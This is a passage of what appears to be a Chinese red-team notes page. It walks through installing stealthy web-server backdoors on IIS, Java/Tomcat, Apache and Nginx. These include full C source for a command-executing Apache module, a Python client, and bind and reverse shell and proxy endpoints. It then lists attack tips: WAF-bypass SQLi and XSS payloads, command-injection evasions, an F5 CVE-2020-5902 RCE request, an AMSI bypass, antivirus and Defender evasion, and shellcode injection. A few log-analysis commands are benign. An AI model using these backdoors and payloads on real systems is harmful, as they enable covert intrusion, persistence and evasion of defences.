在Functions.h中修改连接密码，passfile是dump下来的密码保存的位置，com_header是后门和服务器通信的请求头。
</code></pre>
<p><img src="600.png" alt="image"></p>
<pre><code>打开项目修改完你的密码，直接ctrl+B生成解决方案即可(这里生成的是release版本)
Dll传到服务器，改个名字，执行添加模块
&gt;C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:IsapiDotNet /image:&quot;c:\windows\system32\inetsrv\IsapiDotNet.dll&quot; /add:true
</code></pre>
<p><img src="601.png" alt="image"></p>
<pre><code>在模块中可以看到已经存在了
</code></pre>
<p><img src="602.png" alt="image"></p>
<pre><code>远程连接
&gt;python3 iis_controller.py --url http://192.168.0.98 --password thisismykey
执行命令的方式是
&gt;cmd +命令
</code></pre>
<p><img src="603.png" alt="image"></p>
<pre><code>Dump命令可以dump下来IIS站点的登录的信息，保存在设置的位置。
Inject可以执行shellcode
Cs/msf生成raw格式的shellcode
&gt;inject 位置
</code></pre>
<p><img src="604.png" alt="image"></p>
<h3 id="JAVA-Web-Backdoor"><a href="#JAVA-Web-Backdoor" class="headerlink" title="JAVA Web Backdoor"></a>JAVA Web Backdoor</h3><pre><code>From:https://www.freebuf.com/articles/web/172753.html
https://github.com/rebeyond/memShell
当获取一个webshell或bashshell权限时，下载后门执行注入进程形成无文件复活后门
下载后解压到任意web目录
</code></pre>
<p><img src="605.png" alt="image"></p>
<pre><code>得到2个jar文件
执行，password设置为你的密码
&gt;java -jar inject.jar password
</code></pre>
<p><img src="606.png" alt="image"></p>
<pre><code>注入成功，在web任意页面任意url执行命令
http://192.168.0.121:8080/css/app.css?pass_the_world=password
</code></pre>
<p><img src="607.png" alt="image"></p>
<pre><code>可执行命令，反弹shell，上传/下载文件，列目录，读文件，添加代理，连接菜刀
</code></pre>
<p><img src="608.png" alt="image"></p>
<h3 id="Tomcat-JSP-HideShell"><a href="#Tomcat-JSP-HideShell" class="headerlink" title="Tomcat JSP HideShell"></a>Tomcat JSP HideShell</h3><pre><code>From:https://mp.weixin.qq.com/s/7b3Fyu_K6ZRgKlp6RkdYoA
https://github.com/QAX-A-Team/HideShell
把自己的shell和hideshell传入靶机，先访问自己的shell，目的是为了让 Tomcat 将它编译，并生成 JspServletWrapper 保存在 JspRuntimeContext 中。
</code></pre>
<p><img src="609.png" alt="image"></p>
<pre><code>再访问hideshell.jsp，点击hide你的shell。
</code></pre>
<p><img src="610.png" alt="image"></p>
<pre><code>已经隐藏了
</code></pre>
<p><img src="611.png" alt="image"><br><img src="612.png" alt="image"></p>
<pre><code>再访问hideshell.jsp，可以看到隐藏后的shell的文件名。
</code></pre>
<p><img src="613.png" alt="image"></p>
<pre><code>访问看看
</code></pre>
<p><img src="614.png" alt="image"></p>
<pre><code>当然，也可以把hideshell自身隐藏了，那访问它的方式就是hidden-hideshell.jsp
</code></pre>
<p><img src="615.png" alt="image"></p>
<pre><code>目录里啥都没了
</code></pre>
<p><img src="616.png" alt="image"></p>
<pre><code>此方式隐藏之后请求不会产生日志
</code></pre>
<p><img src="617.png" alt="image"></p>
<pre><code>那如果把shelltest文件夹删掉权限还会在吗？
</code></pre>
<p><img src="618.png" alt="image"></p>
<pre><code>是在的
</code></pre>
<p><img src="619.png" alt="image"></p>
<h3 id="Apache-Module后门1"><a href="#Apache-Module后门1" class="headerlink" title="Apache Module后门1"></a>Apache Module后门1</h3><pre><code>From:https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor
生成模板结构
&gt;apxs -g -n auth
</code></pre>
<p><img src="620.png" alt="image"></p>
<pre><code>编辑mod_auth.c文件
</code></pre>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;httpd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;http_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;http_protocol.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ap_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">auth_handler</span><span class="params">(request_rec *r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">apr_array_header_t</span>    *fields;</span><br><span class="line">    <span class="keyword">int</span>                            i;</span><br><span class="line">    <span class="keyword">apr_table_entry_t</span>           *e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> FLAG = <span class="number">0</span>;</span><br><span class="line">    fields = apr_table_elts(r-&gt;headers_in);</span><br><span class="line">    e = (<span class="keyword">apr_table_entry_t</span> *) fields-&gt;elts;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; fields-&gt;nelts; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(e[i].key, <span class="string">&quot;Authorizations&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            FLAG = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FLAG)&#123;</span><br><span class="line">        <span class="keyword">char</span> * command = e[i].val;</span><br><span class="line">        FILE* fp = popen(command,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> counter = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(counter)&#123;</span><br><span class="line">            counter = fread(buffer, <span class="number">1</span>, <span class="keyword">sizeof</span>(buffer), fp);</span><br><span class="line">            ap_rwrite(buffer, counter, r);</span><br><span class="line">        &#125;</span><br><span class="line">        pclose(fp);</span><br><span class="line">        <span class="keyword">return</span> DONE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DECLINED;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">auth_register_hooks</span><span class="params">(<span class="keyword">apr_pool_t</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ap_hook_handler(auth_handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_MIDDLE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">module</span> AP_MODULE_DECLARE_DATA auth_module = &#123;</span><br><span class="line">    STANDARD20_MODULE_STUFF, </span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* create per-dir    config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* merge  per-dir    config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* create per-server config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* merge  per-server config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* table of config file commands       */</span></span><br><span class="line">    auth_register_hooks  <span class="comment">/* register hooks                      */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>编译后重启apache
&gt;apxs -i -a -c mod_auth.c &amp;&amp; service apache2 restart
</code></pre>
<p><img src="621.png" alt="image"></p>
<pre><code>原文件接受的头是backdoor太明显，这里换成了Authorizations
</code></pre>
<p><img src="622.png" alt="image"></p>
<pre><code>或使用python来执行
</code></pre>
<p><img src="623.png" alt="image"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">host, port, command</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorizations&quot;</span>: command</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;http://%s:%d/&quot;</span> % (host, port)</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    content = response.content</span><br><span class="line">    <span class="built_in">print</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage : &quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\tpython %s [HOST] [PORT]&quot;</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = raw_input(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        exploit(host, port, command)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Apache-Module后门2"><a href="#Apache-Module后门2" class="headerlink" title="Apache Module后门2"></a>Apache Module后门2</h3><pre><code>From:https://github.com/VladRico/apache2_BackdoorMod
.load文件传入/etc/apache2/mods-available/目录，.so文件传入/usr/lib/apache2/modules/目录
启动后门模块，重启apache
&gt;a2enmod backdoor&amp;service apache2 restart
</code></pre>
<p><img src="624.png" alt="image"></p>
<pre><code>Cookie里添加字段password=backdoor
访问http://ip/ping返回如下图说明后门正常允许
</code></pre>
<p><img src="625.png" alt="image"></p>
<pre><code>访问http://ip/bind/12345 开启正向连接，攻击机执行nc ip 12345即可
</code></pre>
<p><img src="626.png" alt="image"></p>
<pre><code>访问http://ip/revtty/192.168.0.107/12138 开启反向连接，攻击机109执行nc监听12138即可
</code></pre>
<p><img src="627.png" alt="image"></p>
<pre><code>访问http://ip/proxy/1337开启socks代理
</code></pre>
<p><img src="628.png" alt="image"><br><img src="629.png" alt="image"><br><img src="630.png" alt="image"></p>
<pre><code>想要结束socks代理可执行
&gt;echo &quot;imdonewithyou&quot; |nc 192.168.0.111 1337
</code></pre>
<p><img src="631.png" alt="image"></p>
<pre><code>即可结束socks代理
以上原作者的文件命名backdoor太明显，可以自己修改文件重新编译
创建模板结构命名为phpmodev
</code></pre>
<p><img src="632.png" alt="image"><br><img src="633.png" alt="image"></p>
<pre><code>修改cookie内容为迷惑字段Authorizations=PHPSESSIONID
</code></pre>
<p><img src="634.png" alt="image"></p>
<h3 id="Apache-Module后门3"><a href="#Apache-Module后门3" class="headerlink" title="Apache Module后门3"></a>Apache Module后门3</h3><pre><code>From: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247491179&amp;idx=1&amp;sn=ab26fe36ac74f5b140e91279ae8018c7
生成模板结构
&gt;apxs -g -n phpdevmod
</code></pre>
<p><img src="635.png" alt="image"></p>
<pre><code>编辑mod_phpdevmod.c文件
编译
&gt;make -e CC=x86_64-linux-gnu-g++
</code></pre>
<p><img src="636.png" alt="image"></p>
<pre><code>生成的.so文件在/.libs目录下
</code></pre>
<p><img src="637.png" alt="image"></p>
<pre><code>将其复制到/usr/lib/apache2/modules/目录
修改/etc/apache2/mods-enabled/php7.0.load文件，添加如下
LoadModule phpdevmod_module /usr/lib/apache2/modules/mod_phpdevmod.so
&lt;Location /qq.jpg&gt;    #可以设置为任何不存在的文件
    setHandler phpdevmod
&lt;/Location&gt;
</code></pre>
<p><img src="638.png" alt="image"></p>
<pre><code>需重启apache服务
访问后门方式http://ip/qq.jpg?命令的url编码
直接访问后门文件
</code></pre>
<p><img src="639.png" alt="image"></p>
<pre><code>636174202F6574632F706173737764为cat /etc/passwd的url编码
</code></pre>
<p><img src="640.png" alt="image"></p>
<h3 id="Nginx-Lua后门"><a href="#Nginx-Lua后门" class="headerlink" title="Nginx Lua后门"></a>Nginx Lua后门</h3><pre><code>From:https://github.com/netxfly/nginx_lua_security
https://github.com/Y4er/Y4er.com/blob/251d88d8a3cf21e9bafe15c43d7900ffeacfa7ea/content/post/nginx-lua-backdoor.md
后门利用的前提是获取到root权限，nginx安装有lua模块。
在nginx.conf中http节处添加，指定lua脚本位置，以及nginx启动时加载的脚本
</code></pre>
<p><img src="641.png" alt="image"></p>
<pre><code>在lua目录/waf/中新建Init.lua，内容如下，require nginx表示加载nginx.lua中的模块。
</code></pre>
<p><img src="642.png" alt="image"></p>
<pre><code>/waf/目录中新建nginx.lua实现执行命令，参数为waf。
</code></pre>
<p><img src="643.png" alt="image"></p>
<pre><code>在nginx配置文件中加入location。
</code></pre>
<p><img src="644.png" alt="image"></p>
<pre><code>效果：
</code></pre>
<p><img src="645.png" alt="image"></p>
<h3 id="PwnNginx"><a href="#PwnNginx" class="headerlink" title="PwnNginx"></a>PwnNginx</h3><pre><code>From:https://github.com/t57root/pwnginx
解压好后编译客户端
&gt;make
</code></pre>
<p><img src="646.png" alt="image"></p>
<pre><code>编辑nginx的源文件/src/core/nginx.c找到configure arguments:在后面添加--prefix=/usr/local/nginx\n指定的是nginx安装的目录
</code></pre>
<p><img src="647.png" alt="image"></p>
<pre><code>重新编译nginx添加后门模块
&gt;./configure --prefix=/usr/local/nginx/ --add-module=/tmp/pwnginx-master/module
</code></pre>
<p><img src="648.png" alt="image"></p>
<pre><code>&gt;make
</code></pre>
<p><img src="649.png" alt="image"></p>
<pre><code>覆盖新的nginx到原nginx目录
&gt;cp -f objs/nginx /usr/local/nginx/sbin/nginx
</code></pre>
<p><img src="650.png" alt="image"></p>
<pre><code>重启nginx
&gt;killall nginx&amp;/usr/local/nginx/sbin/nginx
连接
&gt;./pwnginx shell 目标机 nginx端口 密码
默认密码是t57root，密码的配置文件在pwnginx-master\module\config.h文件夹中，可在重新编译nginx前修改密码
</code></pre>
<p><img src="651.png" alt="image"><br><img src="652.png" alt="image"></p>
<pre><code>此后门也可开启socks隧道
</code></pre>
<h1 id="渗透和红队tips"><a href="#渗透和红队tips" class="headerlink" title="渗透和红队tips"></a>渗透和红队tips</h1><h2 id="父进程破坏"><a href="#父进程破坏" class="headerlink" title="父进程破坏"></a>父进程破坏</h2><pre><code>命令explorer.exe / root与cmd.exe / c类似，只不过使用explorer会破坏进程树，会创建新实例explorer.exe，使之成为新实例下的子进程
</code></pre>
<p><img src="665.png" alt="image"><br><img src="666.png" alt="image"></p>
<h2 id="loT高频率账户密码"><a href="#loT高频率账户密码" class="headerlink" title="loT高频率账户密码"></a>loT高频率账户密码</h2><p><img src="678.png" alt="image"></p>
<h2 id="Bypass-mod-security"><a href="#Bypass-mod-security" class="headerlink" title="Bypass mod_security"></a>Bypass mod_security</h2><pre><code>Xss和注入bypass mod_security
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4... –
&lt;marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)&gt;Y000&lt;/marquee&gt;
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5—
%75%6e%69on = union 
%73%65%6cect = select 
%75%6e%69 = uni = url encode 
%73%65%6c = sel = url encode
</code></pre>
<h2 id="查找git和svn的字典"><a href="#查找git和svn的字典" class="headerlink" title="查找git和svn的字典"></a>查找git和svn的字典</h2><p><img src="679.jpg" alt="image"></p>
<h2 id="Top-25-重定向dorks"><a href="#Top-25-重定向dorks" class="headerlink" title="Top 25 重定向dorks"></a>Top 25 重定向dorks</h2><p><img src="680.jpg" alt="image"></p>
<h2 id="使用grep快速去除垃圾数据"><a href="#使用grep快速去除垃圾数据" class="headerlink" title="使用grep快速去除垃圾数据"></a>使用grep快速去除垃圾数据</h2><pre><code>curl http://host.xx/file.js | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*
cat file | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*
</code></pre>
<p><img src="684.png" alt="image"><br><img src="685.png" alt="image"></p>
<h2 id="已泄露的密码整理出的字典"><a href="#已泄露的密码整理出的字典" class="headerlink" title="已泄露的密码整理出的字典"></a>已泄露的密码整理出的字典</h2><pre><code>https://github.com/FlameOfIgnis/Pwdb-Public
从网上泄露的10亿条数据中整理出的。里面257,669,588被筛选为损坏的数据或测试账户。
10亿个凭据可归结为168,919,919密码和393,386,953用户名.
平均密码长度为9.4822个字符
12.04%包含特殊字符，28.79%密码仅是字母，26.16%仅是小写，13.37%仅是数字，8.83%的密码仅被发现一次
与rockyou的对比，rockyou包含14,344,391个密码，本字典与rockyou相差80%
还有根据不同国家生成的小字典
</code></pre>
<h2 id="命令注入Bypass"><a href="#命令注入Bypass" class="headerlink" title="命令注入Bypass"></a>命令注入Bypass</h2><pre><code>From: @shreyasrx
cat /etc/passwd 
cat /e&quot;t&quot;c/pa&quot;s&quot;swd 
cat /&#39;e&#39;tc/pa&#39;s&#39; swd 
cat /etc/pa??wd 
cat /etc/pa*wd 
cat /et&#39; &#39;c/passw&#39; &#39;d 
cat /et$()c/pa$()$swd
cat /et$&#123;neko&#125;c/pas$&#123;poi&#125; swd 
*echo &quot;dwssap/cte/ tac&quot; | rev 
$(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d) 
w\ho\am\i 
/\b\i\n/////s\h 
who$@ami 
xyz%0Acat%20/etc/passwd 
IFS=,;`cat&lt;&lt;&lt;uname,-a`
/???/??t /???/p??s?? 
test=/ehhh/hmtc/pahhh/hmsswd 
cat $&#123;test//hhh\/hm/&#125; 
cat $&#123;test//hh??hm/&#125;
cat /???/?????d
&#123;cat,/etc/passwd&#125;
</code></pre>
<h2 id="查询是否存在heartbleed漏洞"><a href="#查询是否存在heartbleed漏洞" class="headerlink" title="查询是否存在heartbleed漏洞"></a>查询是否存在heartbleed漏洞</h2><pre><code>cat list.txt | while read line ; do echo &quot;QUIT&quot; | openssl s_client -connect $line:443 2&gt;&amp;1 | grep &#39;server extension &quot;heartbeat&quot; (id=15)&#39; || echo $line: safe; done
</code></pre>
<p><img src="712.png" alt="image"></p>
<h2 id="远程解压文件"><a href="#远程解压文件" class="headerlink" title="远程解压文件"></a>远程解压文件</h2><pre><code>pip install remotezip
#列出远程压缩包文件内容
remotezip -l http://site/bigfile.zip
#解压里面的文件
remotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot;
</code></pre>
<h2 id="Top25-ssrf-dorks"><a href="#Top25-ssrf-dorks" class="headerlink" title="Top25 ssrf dorks"></a>Top25 ssrf dorks</h2><p><img src="714.jpg" alt="image"></p>
<h2 id="使用SecurityTrails-API查询子域名"><a href="#使用SecurityTrails-API查询子域名" class="headerlink" title="使用SecurityTrails API查询子域名"></a>使用SecurityTrails API查询子域名</h2><pre><code>去https://securitytrails.com/申请个免费的API
curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq &#39;.subdomains[]&#39; | sed &#39;s/\&quot;//g&#39; &gt;test.txt 2&gt;/dev/null &amp;&amp; sed &quot;s/$/.target.com/&quot; test.txt | sed &#39;s/ //g&#39; &amp;&amp; rm test.txt
</code></pre>
<p><img src="715.png" alt="image"></p>
<h2 id="邮件地址payload"><a href="#邮件地址payload" class="headerlink" title="邮件地址payload"></a>邮件地址payload</h2><pre><code>XSS
test+(&lt;script&gt;alert(0)&lt;/script&gt;)@example.com
test@example(&lt;script&gt;alert(0)&lt;/script&gt;).com
&quot;&lt;script&gt;alert(0)&lt;/script&gt;&quot;@example.com
SSTI
&quot;&lt;%= 7 * 7 %&gt;&quot;@example.com
test+($&#123;&#123;7*7&#125;&#125;)@example.com
SQL injection
&quot;&#39; OR 1=1 -- &#39;&quot;@example.com 
&quot;mail&#39;); --&quot;@example.com
SSRF
john.doe@abc123.dnslog.cn
john.doe@[127.0.0.1]
头注入
&quot;%0d%0aContent-Length:%200%0d%0a%0d%0a&quot;@example.com
&quot;recipient@test.com&gt;\r\nRCPT TO:&lt;victim+&quot;@test.com
</code></pre>
<h2 id="Web-server日志分析命令"><a href="#Web-server日志分析命令" class="headerlink" title="Web server日志分析命令"></a>Web server日志分析命令</h2><pre><code>https://gist.github.com/hvelarde/ceac345c662429447959625e6feb2b47
通过状态码获取请求总数
awk &#39;&#123;print $9&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort –rn
</code></pre>
<p><img src="716.png" alt="image"></p>
<pre><code>按照IP的请求数量排序
awk &#39;&#123;print $1&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head | awk -v OFS=&#39;\t&#39; &#39;&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;&#39;
</code></pre>
<p><img src="717.png" alt="image"></p>
<pre><code>按照ua的请求数量排序
awk -F&#39;&quot;&#39; &#39;&#123;print $6&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
</code></pre>
<p><img src="718.png" alt="image"></p>
<pre><code>按照url的请求数量排序
awk &#39;&#123;print $7&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
</code></pre>
<p><img src="719.png" alt="image"></p>
<pre><code>按照请求页面为404的url排序
awk &#39;$9 ~ /404/ &#123;print $7&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
按照请求致后端报错的IP排序
awk &#39;$0 ~ /\[error\]/ &amp;&amp; match($0, /(client: )(.*)(, server)/, arr) &#123;print arr[2]&#125;&#39; /var/log/apache2/error.log | sort | uniq -c | sort -rn | awk -v OFS=&#39;\t&#39; &#39;&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;&#39;
获取最近10分钟的请求
awk -v date=$(date +[%d/%b/%Y:%H:%M --date=&quot;-10 minutes&quot;) &#39;$4 &gt; date&#39; /var/log/nginx/access.log
</code></pre>
<h2 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h2><pre><code>$a =[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUt&#39;+&#39;ils&#39;)
$h=&quot;4456625220575263174452554847&quot;
$s =[string](0..13|%&#123;[char][int](53+($h).substring(($_*2),2))&#125;)-replace &quot; &quot;
$b =$a.GetField($s,&#39;NonPublic,Static&#39;)
$b.SetValue($null,$true)
</code></pre>
<p><img src="720.png" alt="image"></p>
<h2 id="Bypass-AMSI-2"><a href="#Bypass-AMSI-2" class="headerlink" title="Bypass AMSI 2"></a>Bypass AMSI 2</h2><pre><code>https://github.com/crawl3r/FunWithAMSI
直接编译完使用即可
[System.Reflection.Assembly]::LoadFile(&quot;C:\\Users\\test\\Desktop\\AmsiFun.dll&quot;)
[Amsi]::Bypass()
</code></pre>
<p><img src="726.png" alt="image"><br><img src="727.png" alt="image"><br><img src="728.png" alt="image"></p>
<h2 id="CVE-2020-5902"><a href="#CVE-2020-5902" class="headerlink" title="CVE-2020-5902"></a>CVE-2020-5902</h2><pre><code>F5 BIG-IP TMUI RCE
https://raw.githubusercontent.com/jas502n/CVE-2020-5902/master/CVE-2020-5902.py
RCE
curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;
读文件
curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#39;
执行Linux命令
/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
/fileSave.jsp?fileName=/tmp/cmd&amp;content=id
/tmshCmd.jsp?command=list+/tmp/cmd
/tmshCmd.jsp?command=delete+cli+alias+private+list
</code></pre>
<h2 id="一些可尝试绕过白名单的执行"><a href="#一些可尝试绕过白名单的执行" class="headerlink" title="一些可尝试绕过白名单的执行"></a>一些可尝试绕过白名单的执行</h2><pre><code>forfiles /p c:\windows\system32 /m notepad.exe /c &lt;bin&gt; 
explorer.exe /root,&quot;&lt;bin&gt;&quot; 
pcalua.exe -a &lt;bin&gt; 
scriptrunner.exe -appvscript &lt;bin&gt; 
wmic process call create &lt;bin&gt; 
rundll32.exe advpack.dll, RegisterOCX &lt;bin&gt;
</code></pre>
<h2 id="绕过lsa-protection"><a href="#绕过lsa-protection" class="headerlink" title="绕过lsa protection"></a>绕过lsa protection</h2><pre><code>https://github.com/RedCursorSecurityConsulting/PPLKiller
</code></pre>
<p><img src="733.png" alt="image"><br><img src="734.png" alt="image"><br><img src="735.png" alt="image"><br><img src="736.png" alt="image"><br><img src="737.png" alt="image"></p>
<h2 id="Pezor免杀"><a href="#Pezor免杀" class="headerlink" title="Pezor免杀"></a>Pezor免杀</h2><pre><code>使用inline_syscall内联注入shellcode，结合sgn，donut等项目，增加了一些反调试技巧
https://github.com/phra/PEzor
$ git clone https://github.com/phra/PEzor.git 
$ cd PEzor 
$ sudo bash install.sh 
$ bash PEzor.sh –h
这里测试下mimikatz，-sleep设置为2分钟，执行后需等两分钟
打包之前
</code></pre>
<p><img src="738.png" alt="image"></p>
<pre><code>打包之后
</code></pre>
<p><img src="739.png" alt="image"><br><img src="740.png" alt="image"><br><img src="741.png" alt="image"></p>
<pre><code>测试下Covenant
</code></pre>
<p><img src="742.png" alt="image"><br><img src="743.png" alt="image"><br><img src="744.png" alt="image"></p>
<h2 id="动态调用进程注入逻辑"><a href="#动态调用进程注入逻辑" class="headerlink" title="动态调用进程注入逻辑"></a>动态调用进程注入逻辑</h2><pre><code>感兴趣可阅读以下
https://github.com/dtrizna/DInvoke_PoC
https://rastamouse.me/blog/process-injection-dinvoke/
https://thewover.github.io/Dynamic-Invoke/
这里测试的是使用donut的python模块。注入notepad进程
</code></pre>
<p><img src="745.png" alt="image"><br><img src="746.png" alt="image"></p>
<h2 id="在Windows-Server-2016和2019中绕过Windows-Defender"><a href="#在Windows-Server-2016和2019中绕过Windows-Defender" class="headerlink" title="在Windows Server 2016和2019中绕过Windows Defender"></a>在Windows Server 2016和2019中绕过Windows Defender</h2><pre><code>当获得了一个webshell的时候，下一步要反弹个shell回来
</code></pre>
<p><img src="747.png" alt="image"></p>
<pre><code>在尝试了https://github.com/trustedsec/unicorn独角兽失败之后，找到了一篇使用golang将shellcode注入到内存的文章
https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
https://github.com/brimstone/go-shellcode
https://golang.org/pkg/syscall/?GOOS=windows#NewLazyDLL
该代码利用golang中的syscall包来调用NewLazyDLL  方法来加载Kernel32.dll，加载Kernel32.dll后，即可将其用于寻址和内存分配。编译后的代码将十六进制格式的msfvenom内容用作命令行参数。
由于代码存在许久，可能直接使用会被检测到，这里对其进行了修改，重命名所有变量，通过URL方式加载shellcode，为了绕过沙盒，添加了一些其他的参数，如果不存在参数则退出执行。
用powershell下载到服务器
</code></pre>
<p><img src="748.png" alt="image"></p>
<pre><code>等了几分钟，发现文件没有被删除，再执行。Msf收到会话
</code></pre>
<p><img src="749.png" alt="image"></p>
<pre><code>在尝试了getuid命令之后，返回了错误，查看了以下目录，还是被删除了
</code></pre>
<p><img src="750.png" alt="image"><br><img src="751.png" alt="image"></p>
<pre><code>本地复现了下，可以看到被检测到了
</code></pre>
<p><img src="752.png" alt="image"></p>
<pre><code>绕过可以看一下微软的文章
https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/configure-server-exclusions-microsoft-defender-antivirus#list-of-automatic-exclusions
Windows Server 2016和2019上的Microsoft Defender Antivirus自动将您注册为某些排除项，具体由您指定的服务器角色定义。请参阅  自动排除项列表 。这些排除项不会被windows defender检查。
</code></pre>
<p><img src="753.png" alt="image"></p>
<pre><code>按照文章，创建个目录PHP5433，修改文件为php-cgi.exe即可绕过wd的防护
</code></pre>
<p><img src="754.png" alt="image"><br><img src="755.png" alt="image"><br><img src="756.png" alt="image"><br><img src="757.png" alt="image"></p>
<pre><code>使用烂土豆提权
</code></pre>
<p><img src="758.png" alt="image"></p>
<pre><code>文中webshell: https://github.com/NetSPI/cmdsql
</code></pre>
<h2 id="内存中解码shellcode绕过av"><a href="#内存中解码shellcode绕过av" class="headerlink" title="内存中解码shellcode绕过av"></a>内存中解码shellcode绕过av</h2><pre><code>https://github.com/mhaskar/Shellcode-In-Memory-Decoder
流程
打开一个进程并检索该进程的HANDLE。
在进程中分配空间（检索内存地址）。
将数据（shellcode）写入该进程中。
执行shellcode。
我们可以使用几个Win32 API执行这些步骤：
OpenProcess()
VirtualAllocEx()
WriteProcessMemory()
CreateRemoteThread()
正常情况下，我们将原始shellcode直接写入到内存中，但是如果AV /EDR检测到了Shellcode，它们肯定会发出警报
所以我们在二进制文件中使用可逆的方式把shellcode编码，再解码写入内存来规避防护。
比如加、减、异或、交换。
使用cs生成个shellcode
</code></pre>
<p><img src="759.png" alt="image"></p>
<pre><code>使用python进行异或
</code></pre>
<p><img src="760.png" alt="image"></p>
<pre><code>该脚本读取我们的shellcode的每个操作码，然后将其与字节0x01（在这种情况下为我们的密钥）进行异或，将其打印为如下的shellcode ：
</code></pre>
<p><img src="761.png" alt="image"></p>
<pre><code>现在，我们将开始实现将为我们执行shellcode注入的C代码。
编译方式
x86_64-w64-mingw32-gcc decoder.c -o decoder.exe -w
我将逐步介绍每个win32 API。
打开过程并获取一个句柄
